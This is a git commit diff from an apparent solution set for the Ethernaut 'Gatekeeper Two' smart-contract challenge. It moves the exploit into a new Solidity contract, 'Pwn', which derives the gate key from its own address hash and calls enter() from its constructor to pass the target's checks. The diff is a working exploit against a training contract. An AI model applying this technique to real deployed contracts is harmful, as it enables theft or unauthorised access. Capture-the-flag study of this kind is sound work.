0a7c24d3cb024e70f5f6fb5ee33f32c4d285093a
Emilio López <emilio@elopez.com.ar>
2020-04-30 14:31:11 -0300

    14-gatekeeper-two: separate pwn code into a new contract

--- 14-gatekeeper-two/test.sol
+++ 14-gatekeeper-two/test.sol
@@ -2,13 +2,22 @@ pragma solidity ^0.5.0;
 
 import 'contract.sol';
 
+contract Pwn {
+  constructor(address g) public {
+    uint64 k = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1);
+    g.call(abi.encodeWithSignature("enter(bytes8)", bytes8(k)));
+  }
+}
+
 contract Test {
   GatekeeperTwo g;
 
   constructor() public {
     g = new GatekeeperTwo();
-    uint64 k = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1);
-    address(g).call(abi.encodeWithSignature("enter(bytes8)", bytes8(k)));
+  }
+
+  function pwn() public {
+    new Pwn(address(g));
   }
 
   function echidna_test_entrant() public returns (bool) {
